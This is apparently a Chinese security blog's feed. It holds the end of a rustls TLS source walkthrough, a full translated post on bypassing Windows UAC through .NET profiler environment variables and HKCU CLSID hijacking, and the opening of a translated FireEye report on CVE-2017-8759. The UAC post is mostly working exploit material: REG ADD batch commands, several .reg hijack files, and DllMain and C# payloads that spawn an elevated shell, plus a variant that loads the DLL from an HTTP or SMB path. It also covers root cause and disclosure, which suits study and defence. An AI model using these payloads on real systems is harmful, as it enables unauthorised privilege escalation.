<p>然后在收到client消息之后，在<code>process_main_protocol</code>中调用对应握手包对象的handle函数，并且会返回握手期望处理的下次数据包对象给state，以便下次收到消息继续处理。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//process_main_protocol</span><br><span class="line">self.state = Some(st.handle(self, msg)?);</span><br></pre></td></tr></table></figure>
<p>握手流程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-----ExpectClientHello::handle</span><br><span class="line">-----ExpectTLS12Certificate::handle //如果需要验证client的证书，有这步</span><br><span class="line">-----ExpectTLS12ClientKX::handle //密钥交换</span><br><span class="line">-----ExpectTLS12CertificateVerify::handle //验证client证书</span><br><span class="line">-----ExpectTLS12CCS::handle //通知使用加密方式发送报文</span><br><span class="line">-----ExpectTLS12Finished::handle //握手完成</span><br><span class="line">-----ExpectTLS12Traffic:: handle //开发传输数据</span><br></pre></td></tr></table></figure>
<p><strong>消息传输</strong></p>
<p>同样，握手完成后，server在<code>ExpectTLS12Traffic::handle</code>中处理后续的传输协议中的消息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">impl State for ExpectTLS12Traffic &#123;</span><br><span class="line">    fn handle(self: Box&lt;Self&gt;, sess: &amp;mut ServerSessionImpl, mut m: Message) -&gt; StateResult &#123;</span><br><span class="line">        println!(&quot;-----ExpectTLS12Traffic::handle&quot;);</span><br><span class="line">        sess.common.take_received_plaintext(m.take_opaque_payload().unwrap());</span><br><span class="line">        Ok(self)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>数据加密和解密流程基本和client类似，不再详述。</p>
<p><strong>另外，client和server握手中需要发送的数据包构造都在hs.rs::emit_xxx函数中</strong></p>
<h3 id="消息相关"><a href="#消息相关" class="headerlink" title="消息相关"></a>消息相关</h3><p>该部分存在单独的msgs目录下，包含了握手过程中各种消息类型的定义，消息传输具体设计的<code>fragment/deframe</code>等。</p>
<p>所有消息统一的结构<code>Message</code>，<code>Message</code>也定义了一下方便获取字段和数据的借口，这里不再详述。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pub struct Message &#123;</span><br><span class="line">    pub typ: ContentType,</span><br><span class="line">    pub version: ProtocolVersion,</span><br><span class="line">    pub payload: MessagePayload,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//msgs/message.rs</span><br><span class="line">MessagePayload</span><br><span class="line">BorrowMessage</span><br><span class="line"></span><br><span class="line">//msgs/handshake.rs</span><br><span class="line">包含握手过程中，证书、密钥交换的一些数据结构</span><br><span class="line"></span><br><span class="line">//msgs/deframe.rs</span><br><span class="line">定义了MessageDeframer，管理Message数据，read/deframe_one</span><br><span class="line"></span><br><span class="line">//msgs/hsjoiner.rs</span><br><span class="line">HandshakeJoiner，重建握手数据，验证数据等定义</span><br><span class="line"></span><br><span class="line">//msgs/enums.rs</span><br><span class="line">各种版本号，算法类型号，握手包类型序号等等的enum定义</span><br><span class="line"></span><br><span class="line">//msgs/ccs.rs</span><br><span class="line">密钥交换相关定义</span><br></pre></td></tr></table></figure>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><table>
<thead>
<tr>
<th>文件</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>key.rs</td>
<td>密钥、证书结构定义</td>
</tr>
<tr>
<td>pemfile.rs</td>
<td>PEM文件解析生成密钥相关接口</td>
</tr>
<tr>
<td>verify.rs</td>
<td>证书验证相关</td>
</tr>
<tr>
<td>suites.rs</td>
<td>加密套件、密钥交换相关</td>
</tr>
<tr>
<td>sign.rs</td>
<td>签名相关</td>
</tr>
<tr>
<td>vecbuf.rs</td>
<td>所有消息数据最底层存储结构，vec构成</td>
</tr>
<tr>
<td>webpki</td>
<td>三方库，完成证书验证</td>
</tr>
<tr>
<td>ring</td>
<td>三方库，完成加密算法相关能力</td>
</tr>
</tbody>
</table>
<p><strong>下篇在根据示例代码分析一下rustls库具体的使用</strong></p>
<p>转载请注明出处：<a href="https://anhkgg.github.io/rustls-source-code-analyze/">https://anhkgg.github.io/rustls-source-code-analyze/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;作者：&lt;strong&gt;anhkgg&lt;/strong&gt; &lt;/li&gt;
&lt;li&gt;日期：&lt;strong&gt;2017-11-16&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;rustls已经支持tls1.3，但是测试分析中使用的tls1.2，所以后面分析主要集中在tls1.2。&lt;/p&gt;
&lt;p&gt;主要分析的源码内容：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;client和server的握手协议流程&lt;/li&gt;
&lt;li&gt;rustls是如何进行数据传输的&lt;/li&gt;
&lt;li&gt;数据传输是如何加密解密的&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="rust" scheme="https://anhkgg.github.io/categories/rust/"/>
    
    
      <category term="rust" scheme="https://anhkgg.github.io/tags/rust/"/>
    
      <category term="rustls" scheme="https://anhkgg.github.io/tags/rustls/"/>
    
      <category term="源码分析" scheme="https://anhkgg.github.io/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
      <category term="TLS/SSL" scheme="https://anhkgg.github.io/tags/TLS-SSL/"/>
    
  </entry>
  
  <entry>
    <title>翻译：通过.NET程序提权绕过UAC</title>
    <link href="https://anhkgg.github.io/tans-net-bypass-uac/"/>
    <id>https://anhkgg.github.io/tans-net-bypass-uac/</id>
    <published>2017-09-21T06:04:46.000Z</published>
    <updated>2017-09-21T06:08:51.861Z</updated>
    
    <content type="html"><![CDATA[<p>.NET框架可以通过用户自定义环境变量和CLSID注册表项来加载profiler DLL或者COM组件DLL，甚至当前进程是提权的。这种行为可以被利用来绕过Windows 7到10（包括最近的RS3）系统的默认UAC设置，如通过自动提权.NET进程（MMC管理单元）来加载任意的DLL。</p>
<a id="more"></a>
<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>去年五月， Casey Smith在他的博客和Twitter上指出.NET分析器的DLL加载可能会被滥用，通过环境变量使合法的.NET程序加载一个恶意DLL</p>
<p>当看到这一点，脑海中第一种想法就是，如果这个方法在高权限.NET进程也可以工作，那这将是一个绕过UAC的好办法。果然，确实如此。</p>
<p>这个问题到写这篇博客时依然没有修复，而且可能一直如此——但是在7月，它被 Stefan Kanthak独立地发现并报告了，按完整披露流程公布了该问题。</p>
<h1 id="绕过UAC"><a href="#绕过UAC" class="headerlink" title="绕过UAC"></a>绕过UAC</h1><p>要让一个.NET应用程序加载任意一个DLL，我们可以使用以下环境变量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">COR_ENABLE_PROFILING=1</span><br><span class="line">COR_PROFILER=&#123;GUID&#125;</span><br><span class="line">COR_PROFILER_PATH=C:\path\to\some.dll</span><br></pre></td></tr></table></figure>
<p>在.NET 4以下版本，CLSID必须在HKCR\CLSID{GUID}\InprocServer32定义包含profiling DLL的路径的注册表键。在最近版本中，CLR通过COR_PROFILER_PATH环境变量来找这个DLL，如果COR_PROFILER_PATH没有定义再使用CLSID查找。</p>
<p>HKCR\CLSID是HKLM和HKCU下Software\Classes\CLSID组合起来显示的。在HKLM（或者系统环境变量）下创建CLSID键需要提权，而在HKCU下创建不需要。需要注意，在用户环境变量和HKCU注册表项下一切也都工作正常。</p>
<p>可以简单使用一段批处理命令让它工作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKCU\Software\Classes\CLSID\&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;\InprocServer32&quot; /ve /t REG_EXPAND_SZ /d &quot;C:\Temp\test.dll&quot; /f</span><br><span class="line">REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER&quot; /t REG_SZ /d &quot;&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;&quot; /f</span><br><span class="line">REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_ENABLE_PROFILING&quot; /t REG_SZ /d &quot;1&quot; /f</span><br><span class="line">REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER_PATH&quot; /t REG_SZ /d &quot;C:\Temp\test.dll&quot; /f</span><br><span class="line">mmc gpedit.msc</span><br></pre></td></tr></table></figure>
<p>这些命令在低权限命令行下可以在高权限的mmc.exe进程中加载C:\temp\test.dll(如果存在)。可以绕过Windows 7到10（包括最新RS3）系统的默认UAC设置。</p>
<p><img src="/img/net-bypass-uac-1.png" alt="net-bypass-uac-1.png"></p>
<p><a href="https://gist.github.com/clavoillotte/f2fba9fa4ba8db14093a62164963d4a9" target="_blank" rel="noopener">内嵌DLL的powershell POC可以在这里找到（只支持X64）。</a></p>
<p>这个DLL只在DLL_PROCESS_ATTACH下运行一个cmd.exe，会产生一个提权的命令行终端，然后马上退出当前进程，阻止MMC控制台弹出。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)</span><br><span class="line">&#123;</span><br><span class="line">    char cmd[] = &quot;cmd.exe&quot;;</span><br><span class="line"></span><br><span class="line">    switch (fdwReason)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        WinExec(cmd, SW_SHOWNORMAL);</span><br><span class="line">        ExitProcess(0);</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在Windows 7,8.1，10 1703和10 RS3 build 16275中测试通过。<br>当然，如果你有可访问的SMB共享，UNC路径也可以工作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COR_PROFILER_PATH=\\server\share\test.dll</span><br></pre></td></tr></table></figure>
<h1 id="根本原因"><a href="#根本原因" class="headerlink" title="根本原因"></a>根本原因</h1><p>COM运行时在运行高权限进程时会阻止在HKCU查找CLSID，所以这种绕过方式无效，但是.NET运行时没有阻止，在这种情况下，.NET在shim组件查找时会查找这些键值。</p>
<p><img src="/img/net-bypass-uac-2.png" alt="net-bypass-uac-2.png"></p>
<p>如果要修复，需要CLR实现和COM一样的检查。</p>
<h1 id="更多维度"><a href="#更多维度" class="headerlink" title="更多维度"></a>更多维度</h1><p>现在我们知道CLR是如何工作的了，我们可以在堆栈中找他CLR调用的其他在HKCU查找CLSID的实例。一个实例是GPEdit（Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager）组件（在我测试虚拟机中CLSID是{B29D466A-857D-35BA-8712-A758861BFEA1}）。</p>
<p><img src="/img/net-bypass-uac-3.png" alt="net-bypass-uac-3.png"></p>
<p>查看HKCU已经存在的项中，好像是指向CLR程序及自己实现的组件。</p>
<p><img src="/img/net-bypass-uac-4.png" alt="net-bypass-uac-4.png"></p>
<p>我们可以在HKCU下像这样定义一个COM项（.reg格式）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;]</span><br><span class="line">@=&quot;Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\Implemented Categories]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\Implemented Categories\&#123;62C8FE65-4EBB-45E7-B440-6E39B2CDBF29&#125;]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\InprocServer32]</span><br><span class="line">@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;</span><br><span class="line">&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;</span><br><span class="line">&quot;Class&quot;=&quot;TestDotNet.Class1&quot;</span><br><span class="line">&quot;RuntimeVersion&quot;=&quot;v4.0.30319&quot;</span><br><span class="line">&quot;ThreadingModel&quot;=&quot;Both&quot;</span><br><span class="line">&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\InprocServer32\10.0.0.0]</span><br><span class="line">&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;</span><br><span class="line">&quot;Class&quot;=&quot;TestDotNet.Class1&quot;</span><br><span class="line">&quot;RuntimeVersion&quot;=&quot;v4.0.30319&quot;</span><br><span class="line">&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\ProgId]</span><br><span class="line">@=&quot;Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager&quot;</span><br></pre></td></tr></table></figure></p>
<p>MMC会加载我们的托管DLL，并且尝试访问TestDotNet.Class1类。C#没有一种简单的创建入口是DllMain的简单DLL（我们很懒所以不想写模块初始化），但是貌似注册表指向的类被加载了，所以我们只需要一个静态构造函数来执行我们的提权代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line"></span><br><span class="line">namespace TestDotNet</span><br><span class="line">&#123;</span><br><span class="line">   public class Class1</span><br><span class="line">   &#123;</span><br><span class="line">      static Class1()</span><br><span class="line">      &#123; </span><br><span class="line">         Process.Start(&quot;cmd.exe&quot;);</span><br><span class="line">         Environment.Exit(0);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>将DLL放在注册表项定义的位置，然后运行gpedit.msc，可以看到弹出了一个提权的终端（和.NET一样）。</p>
<p><img src="/img/net-bypass-uac-5.png" alt="net-bypass-uac-5.png"></p>
<p><img src="/img/net-bypass-uac-6.png" alt="net-bypass-uac-6.png"></p>
<p>这种方式一个有趣的点是CodeBase不仅限于本地文件和SMB共享，这个DLL还可以从HTTP链接中加载。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;CodeBase&quot;=&quot;http://server:8080/test_managed.dll&quot;</span><br></pre></td></tr></table></figure></p>
<p>需要注意的是下载的DLL会拷贝到硬盘上，所以这种方式比本地DLL更好检测（硬盘+网络组合）。</p>
<p>另外一件好事（对攻击者）是这种方式下可以滥用多种CLSID。<br>下面是在compmgmt.msc，event、vwr.msc,secpol.msc和taskschd.msc可使用CLSID：</p>
<ol>
<li>托管DLL的Microsoft.ManagementConsole.Advanced.FrameworkSnapInFactor组件</li>
</ol>
<p><img src="/img/net-bypass-uac-7.png" alt="net-bypass-uac-7.png"><br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;]</span><br><span class="line">@=&quot;Microsoft.ManagementConsole.Advanced.FrameworkSnapInFactory&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;\Implemented Categories]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;\Implemented Categories\&#123;62C8FE65-4EBB-45e7-B440-6E39B2CDBF29&#125;]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;\InprocServer32]</span><br><span class="line">@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;</span><br><span class="line">&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;</span><br><span class="line">&quot;Class&quot;=&quot;TestDotNet.Class1&quot;</span><br><span class="line">&quot;RuntimeVersion&quot;=&quot;v2.0.50727&quot;</span><br><span class="line">&quot;ThreadingModel&quot;=&quot;Both&quot;</span><br><span class="line">&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;\InprocServer32\3.0.0.0]</span><br><span class="line">&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;</span><br><span class="line">&quot;Class&quot;=&quot;TestDotNet.Class1&quot;</span><br><span class="line">&quot;RuntimeVersion&quot;=&quot;v2.0.50727&quot;</span><br><span class="line">&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;</span><br></pre></td></tr></table></figure></p>
<ol>
<li>Native DLL的NDP SymBinder组件，劫持\Server项</li>
</ol>
<p><img src="/img/net-bypass-uac-8.png" alt="net-bypass-uac-8.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;]</span><br><span class="line">@=&quot;NDP SymBinder&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\InprocServer32]</span><br><span class="line">@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;</span><br><span class="line">&quot;ThreadingModel&quot;=&quot;Both&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\InprocServer32\4.0.30319]</span><br><span class="line">@=&quot;4.0.30319&quot;</span><br><span class="line">&quot;ImplementedInThisVersion&quot;=&quot;&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\ProgID]</span><br><span class="line">@=&quot;CorSymBinder_SxS&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\Server]</span><br><span class="line">@=&quot;C:\\Temp\\test_unmanaged.dll&quot;</span><br></pre></td></tr></table></figure>
<ol>
<li>Native DLL的Microsoft Common Language Runtime Meta Data组件，劫持\Server项（只有secpol.msc可用）</li>
</ol>
<p><img src="/img/net-bypass-uac-9.png" alt="net-bypass-uac-9.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;]</span><br><span class="line">@=&quot;Microsoft Common Language Runtime Meta Data&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;\InprocServer32]</span><br><span class="line">@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;</span><br><span class="line">&quot;ThreadingModel&quot;=&quot;Both&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;\InprocServer32\4.0.30319]</span><br><span class="line">@=&quot;4.0.30319&quot;</span><br><span class="line">&quot;ImplementedInThisVersion&quot;=&quot;&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;\ProgID]</span><br><span class="line">@=&quot;CLRMetaData.CorRuntimeHost.2&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;\Server]</span><br><span class="line">@=&quot;..\\..\\..\\..\\Temp\\test_unmanaged.dll&quot;</span><br></pre></td></tr></table></figure>
<p>（注意：路径必须是相对的，否则mmc.exe会尝试加载C:\Windows\Microsoft.NET\Framework64\v4.0.30319\C:\Temp\test_unmanaged.dll）</p>
<h1 id="不是安全边界"><a href="#不是安全边界" class="headerlink" title="不是安全边界"></a>不是安全边界</h1><p>微软多次申明UAC不是一个安全边界，安全从业者以更务实的角度来看它：不要信任UAC，不要用admin运行，用非admin用户运行不需要admin的任务，我非常赞同这种说法。</p>
<p>但是依然很多人用admin运行所有的东西，他们都是渗透测试人员和红色组织（都是坏人）感兴趣的目标。所以我猜测还会有新的关于UAC的有趣技术。</p>
<p>如果为了渗透测试，我推荐使用<a href="https://tyranidslair.blogspot.fr/2017/05/reading-your-way-around-uac-part-1.html" target="_blank" rel="noopener">@tiraniddo的例子</a>（<a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1" target="_blank" rel="noopener">一个已经实现</a>，<a href="https://twitter.com/enigma0x3/status/907397236627329024" target="_blank" rel="noopener">另一个也快来了</a>），它不需要加载DLL，并且目前大部分EDR解决方案还不能捕获它。</p>
<p>另外，如果你也在研究绕过UAC，这个主题外有很多资源，但是下面的必须读一下：</p>
<ul>
<li>@enigma0x3’s research (and his upcoming DerbyCon talk)</li>
<li>@tiraniddo’s bypass techniques on UAC via the SilentCleanup task and process token reading: part 1, part 2 &amp; part 3</li>
<li>@hFireF0X’s UACME project that implements most known UAC bypasses, and his posts on kernelmode</li>
<li>@FuzzySec’s UAC workshop, and his Bypass-UAC project that implements several bypasses in PowerShell</li>
</ul>
<p>非常感谢Casey Smith(<a href="https://twitter.com/subTee" target="_blank" rel="noopener">@subtee</a>)指出.NET profiler DLL技巧，并且感谢对微软开发者找到根本原因给予的帮助，谢谢Matt Graeber (<a href="https://twitter.com/mattifestation/" target="_blank" rel="noopener">@mattifestation</a>) 的意见和review。</p>
<h1 id="进展时间"><a href="#进展时间" class="headerlink" title="进展时间"></a>进展时间</h1><p>2017-05-19 发现bypass<br>2017-05-20 给MSRC发邮件 (cc’ing an MS dev as suggested by @mattifestation)<br>2017-05-22 MSRC创建主题 #38811<br>2017-05-20/23 和 MS dev讨论<br>2017-06-24  MSRC回复: “We have finished our investigation and determined this does not meet the bar for servicing downlevel. UAC is not a security boundary.”<br>2017-07-05 Stefan Kanthak绕过方案的完整披露<br>2017-09-15 发表本篇文章</p>
<p>文章来源：<a href="https://offsec.provadys.com/UAC-bypass-dotnet.html" target="_blank" rel="noopener">https://offsec.provadys.com/UAC-bypass-dotnet.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;.NET框架可以通过用户自定义环境变量和CLSID注册表项来加载profiler DLL或者COM组件DLL，甚至当前进程是提权的。这种行为可以被利用来绕过Windows 7到10（包括最近的RS3）系统的默认UAC设置，如通过自动提权.NET进程（MMC管理单元）来加载任意的DLL。&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>
    
    
      <category term="bypassUAC" scheme="https://anhkgg.github.io/tags/bypassUAC/"/>
    
      <category term="UAC" scheme="https://anhkgg.github.io/tags/UAC/"/>
    
      <category term=".NET" scheme="https://anhkgg.github.io/tags/NET/"/>
    
      <category term="mmc.exe" scheme="https://anhkgg.github.io/tags/mmc-exe/"/>
    
  </entry>
  
  <entry>
    <title>翻译：FireEye揭露CVE-2017-8759：分发FINSPY的0day</title>
    <link href="https://anhkgg.github.io/tans-fireeye-cve-2017-8759-finspy-0day/"/>
    <id>https://anhkgg.github.io/tans-fireeye-cve-2017-8759-finspy-0day/</id>
    <published>2017-09-14T02:12:47.000Z</published>
    <updated>2017-09-14T02:26:09.266Z</updated>
    
    <content type="html"><![CDATA[<p>2017.9.12 | by Genwei Jiang, Ben Read, Tom Bennett | Threat Research</p>
<p>FIreEye近期检测到一个恶意的利用CVE-2017-8759漏洞的微软Office RTF文档。</p>
<p>CVE-2017-8759是SOAP WSDL分析器代码注入漏洞，在解析SOAP WSDL定义的内容中它允许攻击者注入任意代码。</p>
<p>FireEye分析了这个攻击者使用的微软Word文档，它利用任意代码注入来下载和执行一个包含PowerShell命令的VB脚本。</p>
<a id="more"></a>
<p>FireEye将这个漏洞的细节分享给了微软，然后协调了信息披露的时间，发布了修补该漏洞的补丁和安全指导，可以在这里找到它们。</p>
<p>FireEye的邮件，终端以及网络产品都已经可以检测该恶意文档。</p>
<h1 id="针对俄语目标的漏洞"><a href="#针对俄语目标的漏洞" class="headerlink" title="针对俄语目标的漏洞"></a>针对俄语目标的漏洞</h1><p>该恶意文档（Проект.doc）（MD5：fe5c4d6bb78e170abf5cf3741868ea4c）可能是针对俄语目标的。</p>
